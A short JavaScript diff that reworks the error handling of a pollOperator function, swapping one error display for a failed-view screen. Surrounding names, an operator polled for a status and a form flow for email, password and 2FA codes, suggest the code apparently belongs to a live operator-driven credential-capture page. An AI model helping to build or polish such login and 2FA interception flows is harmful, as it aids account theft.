@@ -1260,14 +1260,13 @@ async function pollOperator() {
     } else {
       console.warn("Polling response missing currentStatus:", data);
     }
-  } catch (error) {
+} catch (error) {
     console.error("Error during polling:", error);
     clearInterval(pollingIntervalId);
     isSubmitting = false;
     if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
-    showStyledError('Connection issue. Please check your internet and try again.');
-    hideLoadingOverlay();
-  }
+    showFailedView('Connection issue. Please check your internet and try again.');
+}
 }
 
 // Handle form submission (email/password, 2FA choice, 2FA code)
